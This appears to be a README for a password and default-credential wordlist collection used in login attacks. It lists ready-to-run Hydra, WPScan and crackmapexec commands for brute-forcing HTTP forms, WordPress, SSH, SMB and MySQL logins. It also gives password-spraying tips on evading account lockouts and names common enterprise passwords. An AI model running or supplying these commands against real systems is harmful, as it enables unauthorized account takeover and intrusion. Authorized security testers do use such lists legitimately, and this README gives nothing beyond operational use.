# Credentials (Wordlists for brute force / spraying / default logins)
> **Author:** MD MAHABUBUR RAHMAN

Password + default-credential lists for login fuzzing, credential stuffing, and default-login checks. Use with Hydra / patator / WPScan / Burp Intruder.

## Files
- `default-credentials.txt` — per-product default logins
- `top-passwords.txt` — 75 most-reused passwords (amazing success vs internal tools)
- `top-usernames.txt` — short usernames to pair with

## Usage examples
```bash
# HTTP form login
hydra -L usernames.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# WordPress
wpscan --url https://target.com --passwords top-passwords.txt --usernames admin

# SSH
hydra -L usernames.txt -P passwords.txt ssh://target

# SMB
crackmapexec smb target -u usernames.txt -p passwords.txt

# Redis / Mongo / MySQL quick
hydra -l root -P top-passwords.txt mysql://target
```

## Spraying tips
- **Password spraying** (one password across many users) is far safer than brute force (no lockouts).
- Russian/Chinese may not be in rockyou — add `123456`, `password`, `qwerty`, `admin`, `Passw0rd!`, `Summer2026!` patterns manually.
- Common 2026 enterprise passwords: `Welcome1`, `Password1`, `CompanyName2026`, `Autumn2026!`.
